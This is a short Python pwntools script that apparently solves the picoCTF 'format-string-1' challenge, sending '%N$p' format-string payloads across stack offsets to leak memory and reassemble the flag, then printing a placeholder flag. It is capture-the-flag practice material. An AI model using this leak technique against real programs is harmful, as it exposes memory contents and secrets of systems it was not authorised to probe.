from pwn import *


elf=context.binary =ELF('./format-string-1')

context.log_level='error'

flag =''
for i in range(6,30):
	p =process()
	#p =remote('mimas.picoctf.net' ,51167)
	x ='%'+str(i)+'$p'
	print(x)
	p.sendline(x.encode())
	p.recvline()
	
	
	try:
		
		adr =str(p.recvline())
		print(adr)
		hex_string=adr.split('0x')[1].strip()[:-3]
		print(hex_string)
		binary_data = bytes.fromhex(hex_string)
		print(binary_data.decode('utf-8')[::-1])
		flag =flag+ binary_data.decode('utf-8')[::-1]

	except:
		print(str(p.recv()))
	
	

	p.close()
	


print("Flag :",flag)

print("picoCTF{xxaabbbbccccddddxxeeffff}")

